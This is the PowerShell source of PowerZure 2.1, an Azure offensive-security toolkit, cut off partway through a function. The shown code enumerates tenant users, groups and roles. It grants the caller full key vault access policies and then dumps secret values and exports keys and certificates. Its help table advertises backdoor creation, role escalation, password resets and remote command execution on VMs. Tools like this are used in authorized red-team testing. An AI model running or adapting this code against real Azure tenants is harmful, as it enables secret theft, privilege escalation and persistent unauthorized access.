﻿Set-ExecutionPolicy Bypass
Set-Item Env:\SuppressAzurePowerShellBreakingChangeWarnings "true"

function Get-AzureGraphToken
{
    $token = Get-AzAccessToken -ResourceTypeName MSGraph
    $Headers = @{}
    $Headers.Add("Authorization","Bearer"+ " " + "$($token.token)")    
    $Headers
}
function Get-AzureRESTToken
{
    $token = Get-AzAccessToken
    $Headers = @{}
    $Headers.Add("Authorization","Bearer"+ " " + "$($token.token)")    
    $Headers
}
function Connect-AADUser {
    $ConnectionTest = try{ [Microsoft.Open.Azure.AD.CommonLibrary.AzureSession]::AccessTokens['AccessToken']}
    catch{"Error"}
    If($ConnectionTest -eq 'Error'){ 
    $context = [Microsoft.Azure.Commands.Common.Authentication.Abstractions.AzureRmProfileProvider]::Instance.Profile.DefaultContext
	$token = Get-AzAccessToken -ResourceTypeName AadGraph
    Connect-AzureAD -AadAccessToken $token.token -AccountId $context.Account.Id -TenantId $context.tenant.id}
}

function Show-AzureCurrentUser
{
    $APSUser = Get-AzContext
    $Headers = Get-AzureGraphToken
    if($APSUser)
     {         						  
        $Headers = Get-AzureGraphToken 
        $Login = Connect-AADUser			  
		$obj = New-Object -TypeName psobject 
		$username = $APSUser.Account
        If($APSUser.Subscription){
        $activesub = $APSUser.Subscription.Name + ' (' + $APSUser.Subscription.Id + ')'
        }
        $Subscriptions = get-azsubscription *>&1
        $subcoll =@()
        If ($Subscriptions){
            ForEach ($Subscription in $Subscriptions){
            $sub = $Subscription.Name + ' (' + $Subscription.Id + ')'
            $subcoll += $sub
            }
        }
		$user = Invoke-RestMethod -Headers $Headers -Uri 'https://graph.microsoft.com/beta/me'
		$userid=$user.id
        $Memberships = Get-AzureADUserMembership -ObjectId $userid
        $Groups = @()
        $AADRoles = @()
        ForEach ($Membership in $Memberships){
            If($Membership.ObjectType -eq 'Group'){
            $GroupName = $Membership.DisplayName
            $Groups += $GroupName                  
            }else{
            $AADRoles += $Membership.DisplayName
            }
        } 
        $coll = @()           
		try{$rbacroles = Get-AzRoleAssignment -ObjectId $userid *>&1}catch{}
        If($rbacroles){                                     
            ForEach ($rbacrole in $rbacroles){
            $RBACRoleCollection = $rbacrole.RoleDefinitionName + ' (' +  $rbacrole.scope + ')'
            $coll += $RBACRoleCollection
            }
        }
        $obj | Add-Member -MemberType NoteProperty -Name TenantID -Value $APSUser.Tenant.id
		$obj | Add-Member -MemberType NoteProperty -Name Username -Value $user.userPrincipalName
		$obj | Add-Member -MemberType NoteProperty -Name ObjectId -Value $userId
        $obj | Add-Member -MemberType NoteProperty -Name AADRoles -Value $AADRoles
        $obj | Add-Member -MemberType NoteProperty -Name AADGroups -Value $Groups
		$obj | Add-Member -MemberType NoteProperty -Name AzureRoles -Value $coll
        $obj | Add-Member -MemberType NoteProperty -Name 'Active Subscription' -Value $activesub
        $obj | Add-Member -MemberType NoteProperty -Name 'Available Subscriptions' -Value $subcoll
		$obj
        }
    else{
	Write-Error "Please login with Connect-AzAccount" -Category ConnectionError
    }  
}

function Invoke-PowerZure
{
<# 
.SYNOPSIS
    Displays info about this script.

.PARAMETER 
    -h (Help)

.EXAMPLE 
    Invoke-PowerZure -h
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][switch]$h = $null,
    [Parameter(Mandatory=$false)][switch]$Checks = $null,
    [Parameter(Mandatory=$false)][switch]$Banner = $null)

    If($Checks)
    {
            $ErrorActionPreference = "Stop"
            $Version = $PSVersionTable.PSVersion.Major
            If ($Version -lt 5)
            {
                Write-Host "Az requires at least PowerShell 5.1"
                Exit
            }
            #Module Check
            $Modules = Get-InstalledModule
            if ($Modules.Name -notcontains 'Az.Accounts')
            {
	            Write-host "Install Az PowerShell Module?" -ForegroundColor Yellow 
                $Readhost = Read-Host " ( y / n ) " 
                if ($ReadHost -eq 'y' -or $Readhost -eq 'yes') 
                {
	                Install-Module -Name Az -AllowClobber -Scope CurrentUser
	                $Modules = Get-InstalledModule       
		            if ($Modules.Name -contains 'Az.Accounts')
		            {
			            Write-Host "Successfully installed Az module. Please open a new PowerShell window and re-import PowerZure to continue" -ForegroundColor Yellow
                        Exit
		            }
                }
	
	            if ($ReadHost -eq 'n' -or $Readhost -eq 'no') 
	            {
		            Write-Host "Az PowerShell not installed, PowerZure cannot operate without this module." -ForegroundColor Red
                    Exit
	            }
            }
            if ($Modules.Name -notcontains 'AzureAD'){
	            Write-host "Install AzureAD PowerShell Module?" -ForegroundColor Yellow 
                $Readhost = Read-Host " ( y / n ) " 
                if ($ReadHost -eq 'y' -or $Readhost -eq 'yes') 
                {
	                Install-module -Name AzureADPreview -AllowClobber
	                $Modules = Get-InstalledModule       
		            if ($Modules.Name -contains 'AzureADPreview')
		            {
			            Write-Host "Successfully installed AzureAD module. Please open a new PowerShell window and re-import PowerZure to continue" -ForegroundColor Yellow
                        Exit
		            }
                }
	
	            if ($ReadHost -eq 'n' -or $Readhost -eq 'no') 
	            {
		            Write-Host "AzureAD PowerShell not installed, PowerZure cannot operate without this module." -ForegroundColor Red
                    Exit
	            }
            }
            #Login Check
            $APSUser = Get-AzContext
            if(!$APSUser){
            Write-Error "Please login with Connect-AzAccount" -Category ConnectionError
            Pause
            Exit
            }

    }
     
    if($h -eq $true)
    {
            Write-Host @"
			
			  PowerZure Version 2.1

				List of Functions              

------------------Info Gathering -------------

Get-AzureADRole -------------------- Gets the members of one or all Azure AD role. Roles does not mean groups.
Get-AzureAppOwner ----------------- Returns all owners of all Applications in AAD
Get-AzureDeviceOwner -------------- Lists the owners of devices in AAD. This will only show devices that have an owner.
Get-AzureADGroup --------------------- Gathers a specific group or all groups in AzureAD and lists their members.
Get-AzureIntuneScript -------------- Lists available Intune scripts in Azure Intune
Get-AzureLogicAppConnector --------- Lists the connector APIs in Azure
Get-AzurePIMAssignment ------------- Gathers the Privileged Identity Management assignments. Currently, only AzureRM roles are returned.
Get-AzureRole ---------------------- Gets the members of an Azure RBAC role.
Get-AzureRunAsAccounts ------------- Finds any RunAs accounts being used by an Automation Account
Get-AzureRolePermission ------------ Finds all roles with a certain permission
Get-AzureSQLDB --------------------- Lists the available SQL Databases on a server
Get-AzureTargets ------------------- Compares your role to your scope to determine what you have access to
Get-AzureUser ---------------------- Gathers info on a specific user or all users including their groups and roles in Azure & AzureAD
Show-AzureCurrentUser -------------- Returns the current logged in user name and any owned objects
Show-AzureKeyVaultContent ---------- Lists all available content in a key vault
Show-AzureStorageContent ----------- Lists all available storage containers, shares, and tables

------------------Operational --------------

Add-AzureADGroup ---------------- Adds a user to an Azure AD Group
Add-AzureADRole ----------------- Assigns a specific Azure AD role to a User
Add-AzureSPSecret --------------- Adds a secret to a service principal
Add-AzureRole ------------------- Adds a role to a user in Azure
Connect-AzureJWT ---------------- Logins to Azure using a JWT access token. 
New-AzureBackdoor --------------- Creates a backdoor in Azure via Service Principal
Export-AzureKeyVaultContent ----- Exports a Key as PEM or Certificate as PFX from the Key Vault
Get-AzureKeyVaultContent -------- Get the secrets and certificates from a specific Key Vault or all of them
Get-AzureRunAsCertificate ------- Will gather a RunAs accounts certificate if one is being used by an automation account, which can then be used to login as that account. 
Get-AzureRunbookContent --------- Gets a specific Runbook and displays its contents or all runbook contents
Get-AzureStorageContent --------- Gathers a file from a specific blob or File Share
Get-AzureVMDisk ----------------- Generates a link to download a Virtual Machiche’s disk. The link is only available for 24 hours.
Invoke-AzureCommandRunbook ------ Will execute a supplied command or script from a Runbook if the Runbook is configured with a “RunAs” account
Invoke-AzureCustomScriptExtension Runs a PowerShell script by uploading it as a Custom Script Extension
Invoke-AzureMIBackdoor ---------- Creates a managed identity for a VM and exposes the REST API on it to make it a persistent JWT backdoor generator.
Invoke-AzureRunCommand ---------- Will run a command or script on a specified VM
Invoke-AzureRunMSBuild ---------- Will run a supplied MSBuild payload on a specified VM. 
Invoke-AzureRunProgram ---------- Will run a given binary on a specified VM
Invoke-AzureVMUserDataAgent ----- Deploys the agent used by Invoke-AzureVMUserDataCommand
Invoke-AzureVMUserDataCommand --- Executes a command using the userData channel on a specified Azure VM.
New-AzureUser ------------------- Creates a user in Azure Active Directory
New-AzureIntuneScript ----------- Uploads a PS script to Intune
Set-AzureElevatedPrivileges ----- Elevates the user’s privileges from Global Administrator in AzureAD to include User Access Administrator in Azure RBAC.
Set-AzureSubscription ----------- Sets default subscription. Necessary if in a tenant with multiple subscriptions.
Set-AzureUserPassword ----------- Sets a user’s password
Start-AzureRunbook -------------- Starts a Runbook	
"@
        }
    if($Banner)
    {
Write-Host @' 
8888888b.                                                 ,/	8888888888P                           
888   Y88b                                              ,'/           d88P       
888    888                                            ,' /           d88P    
888   d88P  .d88b.  888  888  888  .d88b.  888d888  ,'  /____       d88P    888  888 888d888  .d88b.  
8888888P"  d88""88b 888  888  888 d8P  Y8b 888P"  .'____    ,'     d88P     888  888 888P"   d8P  Y8b   
888        888  888 888  888  888 88888888 888         /  ,'      d88P      888  888 888     88888888 
888        Y88..88P Y88b 888 d88P Y8b.     888        / ,'       d88P       Y88b 888 888     Y8b.   
888         "Y88P"   "Y8888888P"   "Y8888  888       /,'        d8888888888  "Y88888 888      "Y8888  version 2.1
                                                    /'                                                													
'@ -ForegroundColor Cyan

            Write-Host 'Confused on what to do next? Check out the documentation: ' -ForegroundColor yellow -NoNewline
            Write-Host 'https://powerzure.readthedocs.io/ ' -ForegroundColor Blue -NoNewline
            Write-Host 'or type ' -ForegroundColor yellow -NoNewline
            Write-Host 'Invoke-Powerzure -h ' -ForegroundColor Magenta -NoNewline
            Write-Host 'for a function table.' -ForegroundColor yellow 
            Write-Host ""
            Write-Host 'Please set your default subscription with ' -ForegroundColor yellow -NoNewline 
            Write-Host 'Set-AzureSubscription ' -ForegroundColor Magenta -NoNewline
            Write-Host 'if you have multiple subscriptions. Functions WILL fail if you do not do this. Use '  -ForegroundColor yellow -NoNewline 
            Write-Host 'Show-AzureCurrentUser' -ForegroundColor Magenta -NoNewline
			Write-Host ' to get list your accounts roles & permissions'-ForegroundColor Yellow
   		
    }

	if(!$Checks -and !$h)
		{
			Write-Host "Please login with Connect-AzAccount" -ForegroundColor Red
		}            
}

Invoke-PowerZure -Checks -Banner

function Set-AzureSubscription
{
<# 
.SYNOPSIS
    Sets default subscription
.PARAMETER
   -Id
.EXAMPLE
   Set-AzureSubscription -Id b049c906-7000-4899-b644-f3eb835f04d0
#>

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false,HelpMessage='Enter a subscription ID. Try Show-AzureCurrentUser to see a list of subscriptions')][String]$Id = $null) 
    $subs = Get-AzSubscription	
    Write-Host "Select a subscription to choose as the default subscription:" -ForegroundColor Yellow
    Write-Host "" 
    $i=1
    ForEach ($sub in $subs){
    Write-Host "[$i]"- $sub.name 
    $i++}
    Write-Host ""
    $main = Read-Host "Please select a number: "  
    $choice = $subs[$main-1]
    Set-AzContext -SubscriptionId $choice.Id
}

function Get-AzureADRole
{
<# 
.SYNOPSIS
    Lists the roles in Azure AD and what users are part of the role. 
.PARAMETER
	-All (Lists all roles, even those without a user in them)
    -Role (Specific role)
.EXAMPLE
	Get-AzureADRole -Role 'Global Administrator'
    Get-AzureADRole -Role '4dda258a-4568-4579-abeb-07709e34e307'
	Get-AzureADRole -All
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$False)][String]$Role = $null,
    [Parameter(Mandatory=$False)][Switch]$All = $null)
    $ConnectAAD = Connect-AADUser
    $roles = Get-AzureADDirectoryRole
    
    If($All)
    {
	    ForEach ($AADRole in $Roles)
	    {
	      $roleid = $AADRole.ObjectId
          $members = Get-AzureADDirectoryRoleMember -ObjectId $roleid          
          $obj = New-Object -TypeName psobject
          $obj | Add-Member -MemberType NoteProperty -Name Role -Value $AADRole.DisplayName
          $obj | Add-Member -MemberType NoteProperty -Name UserMember -Value $members.UserPrincipalName
          $obj | Add-Member -MemberType NoteProperty -Name MemberType -Value $members.ObjectType
          If($members.objectType -eq 'ServicePrincipal'){
          $obj | Add-Member -MemberType NoteProperty -Name ServicePrincipalMember -Value $members.AppDisplayName
          }
          $obj
        }	
    }
    If($Role)
    {
        If($Role.length -eq 36)
        {
            Get-AzureADDirectoryRoleMember -ObjectId $Role
        }
        else
        {
            
            $roledata = Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "$Role"}
            $roleid = $roledata.ObjectId 
            Get-AzureADDirectoryRoleMember -ObjectId $roleid
           

        }  
    }
    If(!$All -and !$Role)
    {
        Write-Host "Usage:" -ForegroundColor Red
        Write-Host "Get-AzureADRoleMember -Role '4dda258a-4568-4579-abeb-07709e34e307'" -ForegroundColor Red
        Write-Host "Get-AzureADRoleMember -All" -ForegroundColor Red
        Write-Host "Get-AzureADRoleMember -Role 'Global Administrator'" -ForegroundColor Red

    }
}

function Get-AzureUser
{
<# 
.SYNOPSIS
    Gathers info on a specific user or all users including their groups and roles in Azure & AzureAD

.PARAMETER 
    -Username (User Principal Name)
	-All (Switch)

.EXAMPLE
    Get-AzureUser -Username Test@domain.com
	Get-AzureUser -All
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false,HelpMessage='Enter the username with the domain')][String]$Username = $null,
	[Parameter(Mandatory=$false)][Switch]$All = $null)
    $ConnectAAD = Connect-AADUser
	If($All)
	{
		$users = Get-AzADUser
		    ForEach ($user in $users)
		    {
                $obj = New-Object -TypeName psobject
			    $userid = $user.id
                $Memberships = Get-AzureADUserMembership -ObjectId $userid
                $Groups = @()
                $AADRoles = @()
                ForEach ($Membership in $Memberships){
                    If($Membership.ObjectType -eq 'Group'){
                    $GroupName = $Membership.DisplayName
                    $Groups += $GroupName                  
                    }else{
                    $AADRoles += $Membership.DisplayName
                    }
                } 
                $rbac = @()           
		        try{$rbacroles = Get-AzRoleAssignment -ObjectId $userid *>&1}catch{}
                If($rbacroles){                                     
                    ForEach ($rbacrole in $rbacroles){
                    $RBACRoleCollection = $rbacrole.RoleDefinitionName + ' (' +  $rbacrole.scope + ')'
                    $rbac += $RBACRoleCollection
                    }
                }
		        $obj | Add-Member -MemberType NoteProperty -Name Username -Value $user.userPrincipalName
		        $obj | Add-Member -MemberType NoteProperty -Name ObjectId -Value $userId
                $obj | Add-Member -MemberType NoteProperty -Name AADRoles -Value $AADRoles
                $obj | Add-Member -MemberType NoteProperty -Name AADGroups -Value $Groups
		        $obj | Add-Member -MemberType NoteProperty -Name AzureRoles -Value $rbac
                $obj
		}
	}
	
	If($Username){
        If($Username -notcontains '@'){
            Write-Error 'Please supply the full userprincipalname (user@domain.com)'-Category InvalidArgument
	    }
        else{
	    $obj = New-Object -TypeName psobject
	    $userdata = Get-AzADUser -UserPrincipalName $Username
        $userid = $userdata.Id
        $Memberships = Get-AzureADUserMembership -ObjectId $userid
        $Groups = @()
        $AADRoles = @()
        ForEach ($Membership in $Memberships){
            If($Membership.ObjectType -eq 'Group'){
            $GroupName = $Membership.DisplayName
            $Groups += $GroupName                  
            }else{
            $AADRoles += $Membership.DisplayName
            }
        } 
        $rbac = @()           
	    try{$rbacroles = Get-AzRoleAssignment -ObjectId $userid *>&1}catch{}
        If($rbacroles){                                     
            ForEach ($rbacrole in $rbacroles){
            $RBACRoleCollection = $rbacrole.RoleDefinitionName + ' (' +  $rbacrole.scope + ')'
            $rbac += $RBACRoleCollection
            }
        }
	    $obj | Add-Member -MemberType NoteProperty -Name Username -Value $username
	    $obj | Add-Member -MemberType NoteProperty -Name ObjectId -Value $userId
        $obj | Add-Member -MemberType NoteProperty -Name AADRoles -Value $AADRoles
        $obj | Add-Member -MemberType NoteProperty -Name AADGroups -Value $Groups
	    $obj | Add-Member -MemberType NoteProperty -Name AzureRoles -Value $rbac
        $obj	  

    }
    }
    If(!$Username -and !$All)
    {
        Write-Host "Usage:" -ForegroundColor Red
        Write-Host "Get-AzureUser -Username Test@domain.com" -ForegroundColor Red
        Write-Host "Get-AzureUser -All" -ForegroundColor Red
    }
    
}

function Get-AzureADGroup 
{
<# 
.SYNOPSIS
    Gets all the members of a specific group or all members of all groups. Group does NOT mean role.

.PARAMETER 
    -Group (Group name)
	-All (List all group members of all groups)

.EXAMPLE
	Get-AzureADGroup -Group 'Sql Admins'
	Get-AzureADGroup -All 
#>
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$false,HelpMessage='Group name')][String]$Group = $null,
	[Parameter(Mandatory=$false)][Switch]$All = $false)
    Connect-AADUser
	If($All)
	{
		Write-Host ""
		$groups=Get-AzADGroup
		ForEach ($g in $groups)
		{
            $obj = New-Object -TypeName psobject
			$obj | Add-Member -MemberType NoteProperty -Name GroupName -Value $g.displayname
			$obj | Add-Member -MemberType NoteProperty -Name GroupId -Value $g.Id
			$obj | Add-Member -MemberType NoteProperty -Name MemberName -Value ''
			$obj | Add-Member -MemberType NoteProperty -Name MemberId -Value ''         
			$members = Get-AzADGroupMember -GroupObjectId $g.id 
			ForEach ($member in $members)
			{ 
			    $obj | Add-Member -MemberType NoteProperty -Name MemberName -Value $member.userPrincipalName -Force
			    $obj | Add-Member -MemberType NoteProperty -Name MemberId -Value $member.Id -Force
                				
			}
            $obj
		} 
	}
	If($group)
	{
		$groupdata = Get-AzADGroup -DisplayName $Group
		$obj = New-Object -TypeName psobject
		$obj | Add-Member -MemberType NoteProperty -Name GroupName -Value $Group
		$obj | Add-Member -MemberType NoteProperty -Name GroupId -Value $groupdata.id
		$members = Get-AzADGroupMember -GroupDisplayName $Group
		$obj | Add-Member -MemberType NoteProperty -Name Members -Value $members.UserPrincipalName
		$obj | Add-Member -MemberType NoteProperty -Name Members -Value $members.Id
		$obj	
	
	}	
	if(!$All -and !$Group)
	{
		Write-Error "Must supply a group name or use -All switch" -Category InvalidArgument
	}
}

function Add-AzureADGroup 
{
<# 
.SYNOPSIS
    Adds a user to an Azure AD Group

.PARAMETER 
    -Username (UPN of the user)
    -Group (AAD Group name)

.EXAMPLE
    Add-AzureADGroup -User john@contoso.com -Group 'SQL Users'
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true,HelpMessage='Target Group')][String]$Group = $null,
    [Parameter(Mandatory=$true,HelpMessage='Username to add to group')][String]$Username = $null)    

	Add-AzADGroupMember -MemberUserPrincipalName $Username -TargetGroupDisplayName $Group
}

function Add-AzureADRole
{
 <#
.SYNOPSIS
    Adds a role to a user in AzureAD

.PARAMETER
    -Username (Intended User)
    -UserID (Intended User or Service Principal by ID)
    -Role (Intended role)
    -RoleId (Intended role by Id)
	-ServicePrincipal (Add a role as a service principal)

.EXAMPLE
    Add-AzureADRole -Username test@test.com -Role 'Company Administrator'
	Add-AzureADRole -UserId 6eca6b85-7a3d-4fcf-b8da-c15a4380d286 -Role '4dda258a-4568-4579-abeb-07709e34e307'
#>
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$false)][String]$ServicePrincipal = $null,
    [Parameter(Mandatory=$false)][String]$UserId = $null,
    [Parameter(Mandatory=$false)][String]$Username = $null,
    [Parameter(Mandatory=$false)][String]$RoleId = $null,
    [Parameter(Mandatory=$false)][String]$Role = $null)
    $ConnectAAD = Connect-AADUser

    If($Role)
    {
        $roledata = Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "$Role"}
        $roleid = $roledata.ObjectId
    }
    If($Username){
        If($Username -notcontains '@')
        {
         Write-Error 'Please supply the full userprincipalname (user@domain.com)'-Category InvalidArgument
        }
        else{
            $userdata = Get-AzADUser -UserPrincipalName $Username
            $userid = $userdata.Id
            Add-AzureADDirectoryRoleMember -ObjectId $RoleId -RefObjectId $UserId
        }
    }
    If($ServicePrincipal)
    {
        $spdata = Get-AzADServicePrincipal -DisplayName $ServicePrincipal
        $spid = $spdata.Id
        Add-AzureADDirectoryRoleMember -ObjectId $RoleId -RefObjectId $spid
    }
    If(!$ServicePrincipal -and !$Username)
    {
     Write-Error 'Please supply a userprincipalname (user@domain.com) or service principal name'-Category InvalidArgument
    }
    If(!$Role -and !$RoldID)
    {
     Write-Error 'Please supply a role or roleId'-Category InvalidArgument
    }
}

function Get-AzureTargets
{
<#
.SYNOPSIS 
    Checks your role against the scope of your role to determine what you have access to. 
#>
    $Connect = Connect-AADUser
    $Context = Get-AzContext
    $Headers = Get-AzureGraphToken
    $user = Invoke-RestMethod -Headers $Headers -Uri 'https://graph.microsoft.com/beta/me'
    $userid=$user.id
    $Memberships = Get-AzureADUserMembership -ObjectId $userid
    $aadroles = Get-AzureADUserMembership -ObjectId $userid
    $Groups = @()
    $AADRoles = @()
    $AADRolesDetailed = @()
    ForEach ($Membership in $Memberships){
        If($Membership.ObjectType -eq 'Group'){
        $GroupName = $Membership.DisplayName
        $Groups += $GroupName                  
        }else{
        $AADRoles += $Membership.DisplayName
        $AADRolesDetailed += $Membership
        }
    }           
	
    Write-Host "AzureAD Roles:" -ForegroundColor Magenta
    Write-Host ""
    ForEach ($aadrole in $AADRolesDetailed){
    $aadrolename = $aadrole.DisplayName
    $aadroledescription = $AADRole.Description
    Write-Host "$aadrolename" -ForegroundColor Green -nonewline
    Write-Host " - $aadroledescription"
    }
    Write-Host ""
    Write-Host "Azure RBAC Roles:" -ForegroundColor Magenta
    Write-Host ""
    try{$rbacroles = Get-AzRoleAssignment -ObjectId $userid *>&1}catch{}
    If($rbacroles){    
        $resources = Get-AzResource                                  
        ForEach ($rbacrole in $rbacroles){           
            $rolename = $rbacrole.RoleDefinitionName
            $roledef = Get-AzRoleDefinition -Name $rolename
            $roledesc = $roledef.Description
            $rolescope = $rbacrole.scope
            Write-Host "$rolename" -ForegroundColor Green -NoNewline
            Write-Host " - $roledesc"
            Write-Host "Scope: $rolescope"    
            Write-Host ""  
            Write-Host "Resources under that scope: " -ForegroundColor yellow
            $coll = @()
            ForEach ($resource in $resources){                          
                If($resource.resourceId -match $rolescope){
                        $obj = New-Object -TypeName psobject
                        $obj | Add-Member -MemberType NoteProperty -Name 'Resource Name' -Value $resource.ResourceName
                        $obj | Add-Member -MemberType NoteProperty -Name 'Resource Group Name' -Value $resource.ResourceGroupName
                        $obj | Add-Member -MemberType NoteProperty -Name 'Resource Type' -Value $resource.Type
                        $coll += $obj 
                }       
               
           } $coll | ft               
        } 
    }  
}

function Show-AzureKeyVaultContent
{
<# 
.SYNOPSIS
    Lists all available content in a key vault

.PARAMETER 
    -VaultName (Key Vault Name)
	-All (All Key Vaults)

.EXAMPLE
    Show-AzureKeyVaultContent -Name VaultName
#>

    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$false,HelpMessage='Vault name')][String]$VaultName = $null,
	[Parameter(Mandatory=$false)][Switch]$All = $null)	
	
	$name = Get-AzContext	
	If($All)
	{
		$vaults = Get-AzKeyVault		
		ForEach($vault in $vaults)
		{
			$vaultsname = $vault.VaultName
			Set-AzKeyVaultAccessPolicy -VaultName $vaultsname -UserPrincipalName $name.Account -PermissionsToCertificates create,get,list,delete,import,update,recover,backup,restore -PermissionsToSecrets get,list,delete,recover,backup,restore -PermissionsToKeys create,get,list,delete,import,update,recover,backup,restore
			$Secrets = $Vault | Get-AzKeyVaultSecret
			$Keys = $Vault | Get-AzKeyVaultKey
			$Certificates = $Vault | Get-AzKeyVaultCertificate 
			$obj = New-Object -TypeName psobject	
            $obj | Add-Member -MemberType NoteProperty -Name VaultName -Value $vaultsname
			$obj | Add-Member -MemberType NoteProperty -Name SecretName -Value $Secrets.Name
			$obj | Add-Member -MemberType NoteProperty -Name SecretContentType -Value $Secrets.ContentType
			$obj | Add-Member -MemberType NoteProperty -Name CertificateName -Value $Certificates.Name
			$obj | Add-Member -MemberType NoteProperty -Name KeyName -Value $Keys.Name
			$obj | Add-Member -MemberType NoteProperty -Name KeyEnabled -Value $Keys.Enabled
			$obj | Add-Member -MemberType NoteProperty -Name KeyRecoveryLevel -Value $Keys.RecoveryLevel
            $obj
		}
	}
	If($VaultName)
	{			
		Set-AzKeyVaultAccessPolicy -VaultName $vaultname -UserPrincipalName $name.Account -PermissionsToCertificates create,get,list,delete,import,update,recover,backup,restore -PermissionsToSecrets get,list,delete,recover,backup,restore -PermissionsToKeys create,get,list,delete,import,update,recover,backup,restore
		$Secrets = $vaultname | Get-AzKeyVaultSecret
		$Keys = $vaultname | Get-AzKeyVaultKey
		$Certificates = $vaultname | Get-AzKeyVaultCertificate 
		$obj = New-Object -TypeName psobject	
        $obj | Add-Member -MemberType NoteProperty -Name VaultName -Value $Vaultname
		$obj | Add-Member -MemberType NoteProperty -Name SecretName -Value $Secrets.Name
		$obj | Add-Member -MemberType NoteProperty -Name SecretContentType -Value $Secrets.ContentType
		$obj | Add-Member -MemberType NoteProperty -Name CertificateName -Value $Certificates.Name
		$obj | Add-Member -MemberType NoteProperty -Name KeyName -Value $Keys.Name
		$obj | Add-Member -MemberType NoteProperty -Name KeyEnabled -Value $Keys.Enabled
		$obj | Add-Member -MemberType NoteProperty -Name KeyRecoveryLevel -Value $Keys.RecoveryLevel
        $obj		
	}
	If(!$VaultName -and !$All)
	{
	Write-Error "Usage: Show-KeyVaultContent -Name VaultName" -Category InvalidArgument
	Write-Error "Usage: Show-KeyVaultContent -All" -Category InvalidArgument
	}
	
	
}

function Get-AzureKeyVaultContent
{
<# 
.SYNOPSIS
    Get the secrets and certificates from a specific Key Vault or all of them

.PARAMETER 
    -VaultName (Key Vault Name)
	-All (All Key Vaults)

.EXAMPLE
    Get-AzureKeyVaultContent -Name VaultName
#>
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$false,HelpMessage='Vault name')][String]$VaultName = $null,
	[Parameter(Mandatory=$false)][Switch]$All = $true)	
	
	$name = Get-AzContext
	if($All)
	{
		$vaults = Get-AzKeyVault		
		
		ForEach($vault in $vaults)
		{

			$vaultsname = $vault.VaultName
			Set-AzKeyVaultAccessPolicy -VaultName $vaultsname -UserPrincipalName $name.Account -PermissionsToCertificates create,get,list,delete,import,update,recover,backup,restore -PermissionsToSecrets get,list,delete,recover,backup,restore -PermissionsToKeys create,get,list,delete,import,update,recover,backup,restore
			$Secrets = Get-AzKeyVaultSecret -VaultName $vaultsname
			ForEach($Secret in $Secrets)
			{
				$Value = Get-AzKeyVaultSecret -VaultName $vaultsname -name $Secret.name

				$obj = New-Object -TypeName psobject	
				$obj | Add-Member -MemberType NoteProperty -Name SecretName -Value $Secret.Name
				$obj | Add-Member -MemberType NoteProperty -Name SecretValue -Value $Value.SecretValueText
				$obj | Add-Member -MemberType NoteProperty -Name ContentType -Value $Value.ContentType
				$obj
			}
		}
	}
	If($VaultName)
	{			
		Set-AzKeyVaultAccessPolicy -VaultName $vaultname -UserPrincipalName $name.Account -PermissionsToCertificates create,get,list,delete,import,update,recover,backup,restore -PermissionsToSecrets get,list,delete,recover,backup,restore -PermissionsToKeys create,get,list,delete,import,update,recover,backup,restore
		$Secrets = Get-AzKeyVaultSecret -VaultName $vaultname

		ForEach($Secret in $Secrets)
		{
			$Value = Get-AzKeyVaultSecret -VaultName $vaultname -name $Secret.name

			$obj = New-Object -TypeName psobject	
			$obj | Add-Member -MemberType NoteProperty -Name SecretName -Value $Secret.Name
			$obj | Add-Member -MemberType NoteProperty -Name SecretValue -Value $Value.SecretValueText
			$obj | Add-Member -MemberType NoteProperty -Name ContentType -Value $Value.ContentType
			$obj
		}
	}
	If(!$VaultName -and !$All)
	{
	Write-Error "Usage: Get-KeyVaultContents -Name VaultName" -Category InvalidArgument
	Write-Error "Usage: Get-KeyVaultContents -All" -Category InvalidArgument
	}
	
}

function Export-AzureKeyVaultContent
{
<# 
.SYNOPSIS
    Exports a Key as PEM or Certificate as PFX from the Key Vault

.PARAMETER 
    -VaultName (Key Vault Name)
	-Type (Key or Certificate)
	-Name (Name of Key or Certificate)
	-OutFilePath (Path of where to save the key or file

.EXAMPLE
   Export-AzureKeyVaultContent -VaultName VaultTest -Type Key -Name Testkey1234 -OutFilePath C:\Temp
#>
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$True,HelpMessage='Vault name')][String]$VaultName = $null,
	[Parameter(Mandatory=$True,HelpMessage='Key/Cert name')][String]$Name = $null,
	[Parameter(Mandatory=$True,HelpMessage='Where to save')][String]$OutFilePath = $null,
	[Parameter(Mandatory=$True,HelpMessage='Key or Certificate?')][String]$Type = $null)	

	$user = Get-AzContext
	Set-AzKeyVaultAccessPolicy -VaultName $vaultname -UserPrincipalName $user.Account -PermissionsToCertificates create,get,list,delete,import,update,recover,backup,restore -PermissionsToSecrets get,list,delete,recover,backup,restore -PermissionsToKeys create,get,list,delete,import,update,recover,backup,restore		
	
	If($Type -eq 'Key')
	{
		$Path = $OutFilePath + '\key.pem'
		$Export = Get-AzKeyVaultKey -VaultName $VaultName -KeyName $Name -OutFile $Path
		If($Export)
		{
			Write-Host "Successfully exported key to $path" -Foregroundcolor Green
		}
		else
		{
			Write-Host "Failed to export Key" -Foregroundcolor Red
		}
	}
	If($Type -eq 'Certificate')
	{
		$Path = $OutFilePath + '\Cert.pfx'
		$cert = Get-AzKeyVaultCertificate -VaultName $Vaultname -Name $Name
		$secret = Get-AzKeyVaultSecret -VaultName $vaultName -Name $cert.Name
		$secretByte = [Convert]::FromBase64String($secret.SecretValueText)
		$x509Cert = new-object System.Security.Cryptography.X509Certificates.X509Certificate2
		$x509Cert.Import($secretByte, "", "Exportable,PersistKeySet")
		$type = [System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx
		$pfxFileByte = $x509Cert.Export($type, $password)
		[System.IO.File]::WriteAllBytes("$Path", $pfxFileByte)
		$test = ls C:\temp\cert.pfx
		If($test)
		{
			Write-Host "Successfully exported Certificate to $path" -Foregroundcolor Green
		}
		else
		{
			Write-Host "Failed to export Certificate"
		}
	}
	elseif($Type -ne 'Certificate' -and $Type -ne 'Key')
	{
		Write-Error "-Type must be a Certificate or Key!" -Category InvalidArgument
